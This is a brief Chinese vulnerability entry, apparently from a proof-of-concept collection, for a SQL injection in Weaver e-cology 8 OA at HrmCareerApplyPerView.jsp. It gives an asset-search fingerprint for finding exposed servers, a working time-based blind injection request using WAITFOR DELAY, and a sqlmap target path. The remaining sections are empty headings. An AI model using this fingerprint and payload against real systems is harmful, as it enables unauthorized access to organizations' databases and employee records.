# 泛微E-cology8HrmCareerApplyPerView存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-cology OA"`
- **请求**：`GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+WAITFOR+DELAY+%270%3A0%3A5%27 HTTP/1.1`

**请求体 / payload**
```

sqlmap
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1
```

**其他**
- 泛微E-cology 8 HrmCareerApplyPerView 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微e-cology 8